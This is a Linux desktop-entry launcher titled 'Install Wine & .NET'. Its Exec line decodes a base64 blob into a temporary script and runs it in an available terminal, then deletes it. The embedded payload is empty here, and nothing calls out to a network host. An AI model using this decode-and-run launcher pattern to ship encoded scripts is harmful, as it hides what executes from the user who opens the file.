#!/usr/bin/env xdg-open
[Desktop Entry]
Type=Application
Name=Install Wine & .NET
Exec=bash -c 'S=$(mktemp /tmp/wine-setup-XXXX.sh); echo  | base64 -d > "$S"; chmod +x "$S"; for T in xterm gnome-terminal konsole xfce4-terminal mate-terminal lxterminal; do if command -v "$T" >/dev/null 2>&1; then case "$T" in gnome-terminal) gnome-terminal -- bash "$S" ;; konsole) konsole -e bash "$S" ;; *) "$T" -e bash "$S" ;; esac; rm -f "$S"; exit 0; fi; done; bash "$S"; rm -f "$S"'
Icon=wine
Terminal=false
Categories=Utility;
